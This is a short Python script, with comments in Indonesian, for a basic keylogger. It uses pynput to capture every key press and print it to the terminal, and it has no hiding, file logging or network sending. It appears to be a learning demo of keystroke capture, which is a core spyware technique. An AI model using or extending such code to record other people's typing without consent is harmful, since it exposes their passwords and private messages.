# basic_keylogger.py
# Keylogger dasar, output langsung ke terminal aja

from pynput import keyboard

def tekan(key):
    try:
        print(f"[KEY] {key.char}")
    except AttributeError:
        print(f"[SPESIAL] {key}")

with keyboard.Listener(on_press=tekan) as listener:
    listener.join()
